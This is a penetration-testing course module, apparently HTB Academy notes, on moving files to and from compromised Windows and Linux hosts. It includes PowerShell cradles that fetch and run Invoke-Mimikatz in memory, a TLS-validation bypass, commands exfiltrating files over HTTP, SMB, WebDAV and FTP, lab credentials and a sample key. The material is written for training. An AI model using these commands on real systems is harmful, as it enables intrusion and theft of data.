# File Transfers

There are many situations when transferring files to or from a target system is necessary. Let's imagine the following scenario:

>[!Note]
>**Setting the Stage**
>
>During an engagement, we gain remote code execution (RCE) on an IIS web server via an unrestricted file upload vulnerability. We upload a web shell initially and then send ourselves a reverse shell to enumerate the system further in an attempt to escalate privileges. We attempt to use PowerShell to transferÂ [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)Â (a PowerShell script to enumerate privilege escalation vectors), but PowerShell is blocked by theÂ [Application Control Policy](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control). We perform our local enumeration manually and find that we haveÂ [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege). We need to transfer a binary to our target machine to escalate privileges using theÂ [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)Â tool. We then try to useÂ [Certutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)Â to download the file we compiled ourselves directly from our own GitHub, but the organization has strong web content filtering in place. We cannot access websites such as GitHub, Dropbox, Google Drive, etc., that can be used to transfer files. Next, we set up an FTP Server and tried to use the Windows FTP client to transfer files, but the network firewall blocked outbound traffic for port 21 (TCP). We tried to use theÂ [Impacket smbserver](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)Â tool to create a folder, and we found that outgoing traffic to TCP port 445 (SMB) was allowed. We used this file transfer method to successfully copy the binary onto our target machine and accomplish our goal of escalating privileges to an administrator-level user.

Understanding different ways to perform file transfers and how networks operate can help us accomplish our goals during an assessment. We must be aware of host controls that may prevent our actions, like application whitelisting or AV/EDR blocking specific applications or activities. File transfers are also affected by network devices such as Firewalls, IDS, or IPS which can monitor or block particular ports or uncommon operations.

File transfer is a core feature of any operating system, and many tools exist to achieve this. However, many of these tools may be blocked or monitored by diligent administrators, and it is worth reviewing a range of techniques that may be possible in a given environment.

This module covers techniques that leverage tools and applications commonly available on Windows and Linux systems. The list of techniques is not exhaustive. The information within this module can also be used as a reference guide when working through other HTB Academy modules, as many of the in-module exercises will require us to transfer files to/from a target host or to/from the provided Pwnbox. Target Windows and Linux machines are provided to complete a few hands-on exercises as part of the module. It is worth utilizing these targets to experiment with as many of the techniques demonstrated in the module sections as possible. Observe the nuances between the different transfer methods and note down situations where they would be helpful. Once you have completed this module, try out the various techniques in other HTB Academy modules and boxes and labs on the HTB main platform.

# Windows File Transfer Methods

## Introduction

The Windows operating system has evolved over the past few years, and new versions come with different utilities for file transfer operations. Understanding file transfer in Windows can help both attackers and defenders. Attackers can use various file transfer methods to operate and avoid being caught. Defenders can learn how these methods work to monitor and create the corresponding policies to avoid being compromised. Let's use theÂ [Microsoft Astaroth Attack](https://www.microsoft.com/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/)Â blog post as an example of an advanced persistent threat (APT).

The blog post starts out talking aboutÂ [fileless threats](https://www.microsoft.com/en-us/security/blog/2018/01/24/now-you-see-me-exposing-fileless-malware/). The termÂ `fileless`Â suggests that a threat doesn't come in a file, they use legitimate tools built into a system to execute an attack. This doesn't mean that there's not a file transfer operation. As discussed later in this section, the file is not "present" on the system but runs in memory.

TheÂ `Astaroth attack`Â generally followed these steps: A malicious link in a spear-phishing email led to an LNK file. When double-clicked, the LNK file caused the execution of theÂ [WMIC tool](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic)Â with the "/Format" parameter, which allowed the download and execution of malicious JavaScript code. The JavaScript code, in turn, downloads payloads by abusing theÂ [Bitsadmin tool](https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool).

All the payloads were base64-encoded and decoded using the Certutil tool resulting in a few DLL files. TheÂ [regsvr32](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32)Â tool was then used to load one of the decoded DLLs, which decrypted and loaded other files until the final payload, Astaroth, was injected into theÂ `Userinit`Â process. Below is a graphical depiction of the attack.

![](Pasted%20image%2020250604092338.png)

[Image source](https://www.microsoft.com/security/blog/wp-content/uploads/2019/08/fig1a-astaroth-attack-chain.png)

This is an excellent example of multiple methods for file transfer and the threat actor using those methods to bypass defenses.

This section will discuss using some native Windows tools for download and upload operations. Later in the module, we'll discussÂ `Living Off The Land`Â binaries on Windows & Linux and how to use them to perform file transfer operations.

## Download Operations

We have access to the machineÂ `MS02`, and we need to download a file from ourÂ `Pwnbox`Â machine. Let's see how we can accomplish this using multiple File Download methods.

![](Pasted%20image%2020250604092350.png)

## PowerShell Base64 Encode & Decode

Depending on the file size we want to transfer, we can use different methods that do not require network communication. If we have access to a terminal, we can encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation, decoding the file in the original content. Let's see how we can do this with PowerShell.

An essential step in using this method is to ensure the file you encode and decode is correct. We can useÂ [md5sum](https://man7.org/linux/man-pages/man1/md5sum.1.html), a program that calculates and verifies 128-bit MD5 checksums. The MD5 hash functions as a compact digital fingerprint of a file, meaning a file should have the same MD5 hash everywhere. Let's attempt to transfer a sample ssh key. It can be anything else, from our Pwnbox to the Windows target.

#### Pwnbox Check SSH Key MD5 Hash

```shell
gitblanc@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

#### Pwnbox Encode SSH Key to Base64

```shell
gitblanc@htb[/htb]$ cat id_rsa |base64 -w 0;echo

```

We can copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.

```powershell
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
```

Finally, we can confirm if the file was transferred successfully using theÂ [Get-FileHash](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2)Â cmdlet, which does the same thing thatÂ `md5sum`Â does.

#### Confirming the MD5 Hashes Match

```powershell
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa
```

>[!Note]
>While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.

## PowerShell Web Downloads

Most companies allowÂ `HTTP`Â andÂ `HTTPS`Â outbound traffic through the firewall to allow employee productivity. Leveraging these transportation methods for file transfer operations is very convenient. Still, defenders can use Web filtering solutions to prevent access to specific website categories, block the download of file types (like .exe), or only allow access to a list of whitelisted domains in more restricted networks.

PowerShell offers many file transfer options. In any version of PowerShell, theÂ [System.Net.WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0)Â class can be used to download a file overÂ `HTTP`,Â `HTTPS`Â orÂ `FTP`. The followingÂ [table](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0)Â describes WebClient methods for downloading data from a resource:

|**Method**|**Description**|
|---|---|
|[OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)|Returns the data from a resource as aÂ [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0).|
|[OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)|Returns the data from a resource without blocking the calling thread.|
|[DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)|Downloads data from a resource and returns a Byte array.|
|[DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)|Downloads data from a resource and returns a Byte array without blocking the calling thread.|
|[DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)|Downloads data from a resource to a local file.|
|[DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)|Downloads data from a resource to a local file without blocking the calling thread.|
|[DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)|Downloads a String from a resource and returns a String.|
|[DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0)|Downloads a String from a resource without blocking the calling thread.|

Let's explore some examples of those methods for downloading files using PowerShell.

#### PowerShell DownloadFile Method

We can specify the class nameÂ `Net.WebClient`Â and the methodÂ `DownloadFile`Â with the parameters corresponding to the URL of the target file to download and the output file name.

#### File Download

```powershell
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

#### PowerShell DownloadString - Fileless Method

As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using theÂ [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2)Â cmdlet or the aliasÂ `IEX`.

```powershell
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

`IEX`Â also accepts pipeline input.

```powershell
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

#### PowerShell Invoke-WebRequest

From PowerShell 3.0 onwards, theÂ [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2)Â cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliasesÂ `iwr`,Â `curl`, andÂ `wget`Â instead of theÂ `Invoke-WebRequest`Â full name.

```powershell
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

Harmj0y has compiled an extensive list of PowerShell download cradlesÂ [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239). It is worth gaining familiarity with them and their nuances, such as a lack of proxy awareness or touching disk (downloading a file onto the target) to select the appropriate one for the situation.

#### Common Errors with PowerShell

There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.

![](Pasted%20image%2020250604092453.png)

This can be bypassed using the parameterÂ `-UseBasicParsing`.

```powershell
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:

```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## SMB Downloads

The Server Message Block protocol (SMB protocol) that runs on port TCP/445 is common in enterprise networks where Windows services are running. It enables applications and users to transfer files to and from remote servers.

We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox withÂ [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)Â from Impacket and then useÂ `copy`,Â `move`, PowerShellÂ `Copy-Item`, or any other tool that allows connection to SMB.

#### Create the SMB Server

```shell
gitblanc@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

To download a file from the SMB server to the current working directory, we can use the following command:

#### Copy a File from the SMB Server

```cmd
C:\htb> copy \\192.168.220.133\share\nc.exe

        1 file(s) copied.
```

New versions of Windows block unauthenticated guest access, as we can see in the following command:

```cmd
C:\htb> copy \\192.168.220.133\share\nc.exe

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```

To transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server on our windows target machine:

#### Create the SMB Server with a Username and Password

```shell
gitblanc@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

#### Mount the SMB Server with Username and Password

```cmd
C:\htb> net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

C:\htb> copy n:\nc.exe
        1 file(s) copied.
```

>[!Note]
>You can also mount the SMB server if you receive an error when you use `copy filename \\IP\sharename`.

## FTP Downloads

Another way to transfer files is using FTP (File Transfer Protocol), which use port TCP/21 and TCP/20. We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server.

We can configure an FTP Server in our attack host using Python3Â `pyftpdlib`Â module. It can be installed with the following command:

#### Installing the FTP Server Python3 Module - pyftpdlib

```shell
gitblanc@htb[/htb]$ sudo pip3 install pyftpdlib
```

Then we can specify port number 21 because, by default,Â `pyftpdlib`Â uses port 2121. Anonymous authentication is enabled by default if we don't set a user and password.

#### Setting up a Python3 FTP Server

```shell
gitblanc@htb[/htb]$ sudo python3 -m pyftpdlib --port 21

[I 2022-05-17 10:09:19] concurrency model: async
[I 2022-05-17 10:09:19] masquerade (NAT) address: None
[I 2022-05-17 10:09:19] passive ports: None
[I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<
```

After the FTP server is set up, we can perform file transfers using the pre-installed FTP client from Windows or PowerShellÂ `Net.WebClient`.

#### Transferring Files from an FTP Server Using PowerShell

```powershell
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.

#### Create a Command File for the FTP Client and Download the Target File

```cmd
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```

## Upload Operations

There are also situations such as password cracking, analysis, exfiltration, etc., where we must upload files from our target machine into our attack host. We can use the same methods we used for download operation but now for uploads. Let's see how we can accomplish uploading files in various ways.

## PowerShell Base64 Encode & Decode

We saw how to decode a base64 string using Powershell. Now, let's do the reverse operation and encode a file so we can decode it on our attack host.

#### Encode File Using PowerShell

We copy this content and paste it into our attack host, use theÂ `base64`Â command to decode it, and use theÂ `md5sum`Â application to confirm the transfer happened correctly.

## PowerShell Web Uploads

PowerShell doesn't have a built-in function for upload operations, but we can useÂ `Invoke-WebRequest`Â orÂ `Invoke-RestMethod`Â to build our upload function. We'll also need a web server that accepts uploads, which is not a default option in most common webserver utilities.

For our web server, we can useÂ [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the PythonÂ [HTTP.server module](https://docs.python.org/3/library/http.server.html), which includes a file upload page. Let's install it and start the webserver.

#### Installing a Configured WebServer with Upload

```shell
gitblanc@htb[/htb]$ pip3 install uploadserver

Collecting upload server
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```

```shell
gitblanc@htb[/htb]$ python3 -m uploadserver

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now we can use a PowerShell scriptÂ [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1)Â which usesÂ `Invoke-RestMethod`Â to perform the upload operations. The script accepts two parametersÂ `-File`, which we use to specify the file path, andÂ `-Uri`, the server URL where we'll upload our file. Let's attempt to upload the host file from our Windows host.

#### PowerShell Script to Upload a File to Python Upload Server

```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```

### PowerShell Base64 Web Upload

Another way to use PowerShell and base64 encoded files for upload operations is by usingÂ `Invoke-WebRequest`Â orÂ `Invoke-RestMethod`Â together with Netcat. We use Netcat to listen in on a port we specify and send the file as aÂ `POST`Â request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.

```powershell
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.

```shell
gitblanc@htb[/htb]$ nc -lvnp 8000

listening on [any] 8000 ...

## SMB Uploads

We previously discussed that companies usually allow outbound traffic usingÂ `HTTP`Â (TCP/80) andÂ `HTTPS`Â (TCP/443) protocols. Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks. For more information on this, we can read the Microsoft postÂ [Preventing SMB traffic from lateral connections and entering or leaving the network](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a).

An alternative is to run SMB over HTTP withÂ `WebDav`.Â `WebDAV`Â [(RFC 4918)](https://datatracker.ietf.org/doc/html/rfc4918)Â is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. TheÂ `WebDAV`Â protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring.Â `WebDAV`Â can also use HTTPS.

When you useÂ `SMB`, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP. In the following Wireshark capture, we attempt to connect to the file shareÂ `testing3`, and because it didn't find anything withÂ `SMB`, it usesÂ `HTTP`.

![](Pasted%20image%2020250604092731.png)

#### Configuring WebDav Server

To set up our WebDav server, we need to install two Python modules,Â `wsgidav`Â andÂ `cheroot`Â (you can read more about this implementation here:Â [wsgidav github](https://github.com/mar10/wsgidav)). After installing them, we run theÂ `wsgidav`Â application in the target directory.

#### Installing WebDav Python modules

```shell
gitblanc@htb[/htb]$ sudo pip3 install wsgidav cheroot

[sudo] password for plaintext: 
Collecting wsgidav
  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)

     ...SNIP...
```

#### Using the WebDav Python module

```shell
gitblanc@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 

[sudo] password for plaintext: 
Running without configuration file.
10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.

```

#### Connecting to the Webdav Share

Now we can attempt to connect to the share using theÂ `DavWWWRoot`Â directory.

```cmd
C:\htb> dir \\192.168.49.128\DavWWWRoot

 Volume in drive \\192.168.49.128\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\192.168.49.128\DavWWWRoot

05/18/2022  10:05 AM    <DIR>          .
05/18/2022  10:05 AM    <DIR>          ..
05/18/2022  10:05 AM    <DIR>          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free
```

>[!Note]
>`DavWWWRoot`Â is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.

You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder

#### Uploading Files using SMB

```cmd
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

>[!Note]
>If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.

## FTP Uploads

Uploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP Server using the Python moduleÂ `pyftpdlib`, we need to specify the optionÂ `--write`Â to allow clients to upload files to our attack host.

```shell
gitblanc@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write

/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  warnings.warn("write permissions assigned to anonymous user.",
[I 2022-05-18 10:33:31] concurrency model: async
[I 2022-05-18 10:33:31] masquerade (NAT) address: None
[I 2022-05-18 10:33:31] passive ports: None
[I 2022-05-18 10:33:31] >>> starting FTP server on 0.0.0.0:21, pid=5155 <<<
```

Now let's use the PowerShell upload function to upload a file to our FTP Server.

#### PowerShell Upload File

```powershell
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

#### Create a Command File for the FTP Client to Upload a File

```cmd
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```

## Recap

We discussed several methods for downloading and uploading files using Windows native tools, but there's more. In the following sections, we'll discuss other mechanisms and tools we can use to perform file transfer operations.

>[!Example]
>The Academy's exercises for this section.

 >*RDP to 10.129.189.144 (ACADEMY-MISC-MS02) with user "htb-student" and password "HTB_@cademy_stdnt!". Upload the attached file named upload_win.zip to the target using the method of your choice. Once uploaded, unzip the archive, and run "hasher upload_win.txt" from the command line. Submit the generated hash as your answer.*
 
To do so, I'll use the following command to connect via RDP:

```shell
xfreerdp3 /u:htb-student /p:'HTB_@cademy_stdnt!' /v:10.129.189.144 /f /clipboard
```

I'll use the PowerShell DownloadFile Method.
- First I set up  a python server where I host the zip file:

```shell
python3 -m http.server 8090
```

- Then I executed this command:

```powershell
(New-Object Net.WebClient).DownloadFile('http://10.10.14.119:8090/upload_win.zip','C:\Users\Public\Downloads\upload_win.zip')
```

- Now I unzip the file:

```powershell
Expand-Archive -Path "C:\Users\Public\Downloads\upload_win.zip" -DestinationPath "C:\Users\Public\Downloads\"
```

- Then I did the command required:

```powershell
hasher upload_win.txt
```

# Linux File Transfer Methods

Linux is a versatile operating system, which commonly has many different tools we can use to perform file transfers. Understanding file transfer methods in Linux can help attackers and defenders improve their skills to attack networks and prevent sophisticated attacks.

A few years ago, we were contacted to perform incident response on some web servers. We found multiple threat actors in six out of the nine web servers we investigated. The threat actor found a SQL Injection vulnerability. They used a Bash script that, when executed, attempted to download another piece of malware that connected to the threat actor's command and control server.

The Bash script they used tried three download methods to get the other piece of malware that connected to the command and control server. Its first attempt was to useÂ `cURL`. If that failed, it attempted to useÂ `wget`, and if that failed, it usedÂ `Python`. All three methods useÂ `HTTP`Â to communicate.

Although Linux can communicate via FTP, SMB like Windows, most malware on all different operating systems usesÂ `HTTP`Â andÂ `HTTPS`Â for communication.

This section will review multiple ways to transfer files on Linux, including HTTP, Bash, SSH, etc.

## Download Operations

We have access to the machineÂ `NIX04`, and we need to download a file from ourÂ `Pwnbox`Â machine. Let's see how we can accomplish this using multiple file download methods.

![](Pasted%20image%2020250604102418.png)

## Base64 Encoding / Decoding

Depending on the file size we want to transfer, we can use a method that does not require network communication. If we have access to a terminal, we can encode a file to a base64 string, copy its content into the terminal and perform the reverse operation. Let's see how we can do this with Bash.

#### Pwnbox - Check File MD5 hash

```shell
gitblanc@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

We useÂ `cat`Â to print the file content, and base64 encode the output using a pipeÂ `|`. We used the optionÂ `-w 0`Â to create only one line and ended up with the command with a semi-colon (;) andÂ `echo`Â keyword to start a new line and make it easier to copy.

#### Pwnbox - Encode SSH Key to Base64

```shell
gitblanc@htb[/htb]$ cat id_rsa |base64 -w 0;echo

